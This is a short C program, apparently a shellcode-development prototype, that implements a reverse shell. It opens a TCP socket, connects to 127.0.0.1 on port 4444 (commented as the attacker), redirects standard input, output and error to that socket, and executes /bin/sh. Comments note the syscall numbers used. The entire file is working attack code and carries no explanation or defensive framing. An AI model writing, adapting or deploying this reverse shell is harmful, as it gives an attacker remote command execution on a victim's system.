#include<unistd.h>
#include<netinet/in.h>
#include <arpa/inet.h>


int main(){
	//create a socket
	int socketfd = socket(AF_INET  , SOCK_STREAM , 0); // 2 / 1  socket - 41
	
	//Connect to attacker
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	connect(socketfd , (struct sockaddr *)&addr , sizeof(addr)); // connect - 42
	
	//Redirect stdin/stdout/stderr to socket 
	dup2(socketfd , 0);   //dup2 - 33
	dup2(socketfd , 1);
	dup2(socketfd , 2);
	
	//spawn shell
	execve("/bin/sh",NULL , NULL); 
	
}

